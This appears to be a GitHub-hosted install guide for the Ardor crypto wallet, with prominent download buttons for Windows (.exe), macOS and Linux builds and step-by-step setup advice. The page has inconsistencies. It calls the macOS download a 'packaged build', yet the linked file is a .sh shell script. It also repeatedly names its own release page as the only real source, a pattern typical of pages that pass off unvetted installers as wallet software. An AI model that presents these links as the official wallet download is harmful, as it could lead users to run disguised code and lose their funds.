![Ardor Wallet guide](assets/banner-article.png)

# Install the Ardor wallet on Windows, macOS or Linux

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

Installing the Ardor wallet takes a download from the GitHub releases page, the asset that matches your operating system, and a Java runtime already present on the machine. Windows receives an installer, macOS a packaged build, and Linux an archive that runs in place. The first start then asks one question that matters: full client or light client.

## What you need before you install

Three things decide whether a first install goes smoothly, and only one of them is the [Ardor download](https://github.com/ardor-software/ardor-wallet-guides/blob/main/verify-your-ardor-wallet-download.md) itself.

| What | Why it matters | How to check |
|---|---|---|
| Java runtime | The wallet is a Java application. Java 8 is the stated minimum and Java 11 is recommended. | Run `java -version` in a terminal. Anything from 8 up works; 11 or newer is the smoother path. |
| Disk space | A full client stores the blockchain on your machine and grows with it. | Several gigabytes free before the first sync on a full client; almost nothing on a light client. |
| Your secret, written down | The passphrase or seed is the account. Nothing recovers it later. | Paper, before the account holds funds. |

## Get the right asset

Open the GitHub releases page and read the notes for the current release before downloading anything. The page lists one asset per platform, plus database downloads that are only relevant to people restoring a [node](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-light-client-versus-full-node.md). Take the asset for your system and nothing else.

Do not install a build from a search result, an advert, a chat message or a mirror site. The wallet is self-custody software, so a substituted build is the one mistake that cannot be undone later, and the [Ardor release](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-the-current-ardor-release-changes.md) page is the only source that ships the real thing.

## Install on Windows

1. Download the Windows installer from the current release.
2. Run it. Windows may show a SmartScreen prompt for a new release; confirm you are running the file you just downloaded from the release page.
3. Let the installer finish and start the [Ardor wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-is-an-ardor-wallet.md) from the shortcut it creates.
4. If the app closes immediately with a Java message, install a current Java runtime and start it again. The Java error guide covers the exact symptoms.

The installer keeps the application and the blockchain data in separate places, so removing the application does not delete your account. Your account was never in the application to begin with; it comes back from the passphrase or seed.

## Install on macOS

1. Download the macOS package from the current release.
2. Run the packaged build and allow it in System Settings if macOS blocks the first launch.
3. Start the wallet. If the system reports that Java is missing, install a current runtime first.
4. Keep the package in a folder you can find again, because a newer build installs exactly the same way, and having the previous one to hand makes a rollback a copy rather than a search.

If the app opens and then shows no balance on a full client, that is the chain still downloading rather than a failed install. The zero balance guide explains the difference between an empty account and an unfinished sync.

## Install on Linux

1. Download the Linux archive from the current release.
2. Unpack it into a directory you own, such as your home folder, rather than a system path that needs elevated rights.
3. Make sure a Java runtime is on the path, then start the wallet from inside the unpacked directory.
4. The blockchain database lives in the `nxt_db` folder inside that directory when you run a full client, so keep the whole folder together if you move it.

Running from an unpacked archive is normal for this wallet. There is no package repository to add and no service to enable, and unpacking a new release into a fresh directory leaves the old one intact until you delete it.

## Choose full client or light client on first start

The wallet asks whether to download the blockchain. A full client validates the chain locally, takes disk space and a first sync, and is the right choice if you intend to forge or to depend on nobody else's server. A light client starts immediately and reads balances from remote nodes, which suits occasional use.

The choice is not permanent. A light client can be converted later by reinstalling without that option, which is also the fix for the one known limitation of light mode: a transaction can appear submitted without being broadcast. That behaviour has a workaround, not a hidden cause.

## First start checklist

Run through this once, immediately after the install, while the download is still fresh and nothing is at stake. Every item here is cheaper to fix now than after the account holds funds.

1. The wallet opens and shows a login screen with a passphrase tab and an account tab.
2. Your passphrase or seed opens the address you expect, and the same address opens again after a restart.
3. The chain height is increasing, or the light client reports a reachable node.
4. Ignis and the other child chains appear in the chain selector.
5. The written copy of your secret matches exactly, including spacing and capitalisation.

## FAQ

### Do I need Java installed before the wallet?

Yes. The wallet is a Java application, so a machine without a runtime starts it and watches it close. Java 8 is the floor the docs state, and they point at Java 11.

### Which file do I download for my system?

One asset per platform on the GitHub releases page: an installer for Windows, a package for macOS and an archive for Linux. There is no disk image for macOS, so the package is the macOS download.

### Can I install it on a machine with no internet?

The installer can be copied to that machine, but the wallet still needs a connection to reach the chain, either through a full sync or through remote nodes in light mode.

### Will installing a new release delete my account?

No. The account comes from the passphrase or seed and is not stored in the application folder. Updating the application leaves the account untouched.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [What the Ardor wallet is, and which download is the real one](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-is-an-ardor-wallet.md)
- [Verify an Ardor wallet download before you run it](https://github.com/ardor-software/ardor-wallet-guides/blob/main/verify-your-ardor-wallet-download.md)
- [Fix the Java error that stops the Ardor wallet](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/fix-ardor-wallet-java-error.md)
- [Ardor light client or full node: choose before you start](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-light-client-versus-full-node.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
